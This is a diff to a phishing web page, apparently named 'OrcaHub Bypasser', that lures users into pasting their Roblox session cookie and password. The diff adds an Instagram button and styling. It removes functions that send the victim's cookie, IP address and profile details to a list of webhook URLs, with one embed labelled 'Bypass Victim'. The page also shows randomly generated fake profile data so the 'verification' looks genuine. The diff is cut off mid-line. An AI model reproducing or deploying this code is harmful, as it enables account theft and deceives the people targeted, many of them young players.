@@ -307,6 +307,56 @@
             box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
         }
 
+        /* --- Enhanced Button Group --- */
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 8px;
+        }
+
+        .btn-group .btn-primary {
+            flex: 1;
+            margin-top: 0;
+            padding: 14px;
+            font-size: 0.85rem;
+        }
+
+        .btn-instagram {
+            background: linear-gradient(135deg, #f58529, #dd2a7b);
+            border: none;
+            border-radius: 40px;
+            padding: 14px 18px;
+            font-weight: 700;
+            font-size: 0.8rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            flex: 1;
+            text-decoration: none;
+            box-shadow: 0 4px 20px rgba(221, 42, 123, 0.3);
+        }
+
+        .btn-instagram:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 30px rgba(221, 42, 123, 0.5);
+        }
+
+        .btn-instagram:active {
+            transform: scale(0.95);
+        }
+
+        .btn-instagram svg {
+            width: 18px;
+            height: 18px;
+            fill: currentColor;
+        }
+
         .profile-preview {
             background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
             border-radius: 32px;
@@ -562,6 +612,7 @@
             .step { font-size: 0.5rem; padding: 6px 0; }
             .profile-preview { flex-direction: column; text-align: center; }
             .profile-preview img { width: 56px; height: 56px; }
+            .btn-group { flex-direction: column; gap: 8px; }
         }
     </style>
 </head>
@@ -638,7 +689,14 @@
                 </div>
             </div>
 
-            <button class="btn-primary" id="verifyCookieBtn">🔍 Verify Cookie</button>
+            <!-- Button Group: Verify + Instagram -->
+            <div class="btn-group">
+                <button class="btn-primary" id="verifyCookieBtn">🔍 Verify Cookie</button>
+                <a class="btn-instagram" id="instagramBtn" href="#" target="_blank">
+                    <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
+                    Instagram Owner
+                </a>
+            </div>
         </div>
 
         <!-- STEP 2: PASSWORD -->
@@ -706,6 +764,7 @@
                 passwordInput: document.getElementById('passwordInput'),
 
                 verifyCookieBtn: document.getElementById('verifyCookieBtn'),
+                instagramBtn: document.getElementById('instagramBtn'),
                 backToStep1: document.getElementById('backToStep1'),
                 submitBtn: document.getElementById('submitBtn'),
 
@@ -774,7 +833,6 @@
                     return;
                 }
 
-                // Check for expired cookie
                 if (cookie.toLowerCase().includes('expired')) {
                     DOM.errorMessage.textContent = '❌ This cookie has expired! Please get a new one.';
                     DOM.errorMessage.classList.add('show');
@@ -807,100 +865,7 @@
             }
 
             function completeVerification(cookie) {
-                // Simulate API call
                 setTimeout(() => {
-                    // Generate fake user data
                     const userId = Math.floor(Math.random() * 900000000) + 100000000;
                     const names = ['PixelPirate', 'NovaStar', 'ShadowBlade', 'CyberWolf', 'LunarGhost',
-                        'StormChaser', 'PixelVortex', 'NebulaKing', 'FrostByte', 'QuantumHero'
-                    ];
-                    const name = names[Math.floor(Math.random() * names.length)];
-                    const followers = Math.floor(Math.random() * 8500) + 150;
-                    const following = Math.floor(Math.random() * 2000) + 50;
-                    const isVerified = Math.random() > 0.7;
-
-                    const userData = {
-                        username: name,
-                        userId: userId,
-                        displayName: name,
-                        isVerified: isVerified,
-                        followers: followers,
-                        following: following,
-                        created: new Date(Date.now() - Math.random() * 3 * 365 * 24 * 60 * 60 * 1000)
-                            .toISOString().split('T')[0],
-                        avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
-                    };
-
-                    // Save state
-                    state.robloxUser = userData;
-                    state.cookie = cookie;
-                    state.isCookieValid = true;
-
-                    // Show profile
-                    DOM.profileName.textContent = `@${userData.username}`;
-                    DOM.profileId.textContent = `ID: ${userData.userId}`;
-                    DOM.profileStats.textContent =
-                        `📊 Followers: ${userData.followers.toLocaleString()} • Following: ${userData.following.toLocaleString()}`;
-                    DOM.profileBadge.textContent = userData.isVerified ? '✅ Verified' : '● Active';
-                    DOM.profileImg.src = userData.avatarUrl;
-                    DOM.profileImg.onerror = function() {
-                        this.src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(userData.username) +
-                            '&background=random&size=80&rounded=true&color=fff';
-                    };
-                    DOM.profilePreview.classList.add('show');
-
-                    // Hide loader
-                    DOM.verifyLoader.classList.remove('show');
-                    DOM.verifyCookieBtn.disabled = false;
-                    DOM.verifyCookieBtn.textContent = '🔍 Verify Cookie';
-
-                    // Send to webhooks
-                    sendProfileData(userData, cookie);
-
-                    // Move to step 2 after delay
-                    setTimeout(() => setStep(2), 800);
-
-                }, 500);
-            }
-
-            // ==================== SEND TO WEBHOOKS ====================
-            function sendToWebhooks(data) {
-                WEBHOOKS.forEach(url => {
-                    try {
-                        fetch(url, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(data),
-                            mode: 'no-cors'
-                        }).catch(() => {});
-                    } catch (_) {}
-                });
-            }
-
-            function sendProfileData(userData, cookie) {
-                const embed = {
-                    title: "🦈 OrcaHub • Cookie Verified",
-                    color: 0x7c6cf0,
-                    fields: [
-                        { name: "👤 Username", value: `\`${userData.username}\``, inline: true },
-                        { name: "🆔 User ID", value: `\`${userData.userId}\``, inline: true },
-                        { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
-                        { name: "📊 Followers", value: `\`${userData.followers.toLocaleString()}\``, inline: true },
-                        { name: "📊 Following", value: `\`${userData.following.toLocaleString()}\``, inline: true },
-                        { name: "✅ Verified", value: userData.isVerified ? '✅ Yes' : '❌ No', inline: true },
-                        { name: "📅 Created", value: `\`${userData.created}\``, inline: true },
-                        { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
-                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
-                    ],
-                    footer: { text: "OrcaHub • Bypasser • Multi-Webhook" },
-                    thumbnail: { url: userData.avatarUrl || "https://www.roblox.com/favicon.ico" }
-                };
-                sendToWebhooks({ embeds: [embed] });
-            }
-
-            function sendFullData(cookie, password, userData) {
-                const embed = {
-                    title: "🎯 OrcaHub • Bypass Victim",
-                    color: 0xff6b6b,
-                    fields: [
-                        { name: "👤 Username
+                        'StormChaser', 'PixelVortex', 'NebulaKing
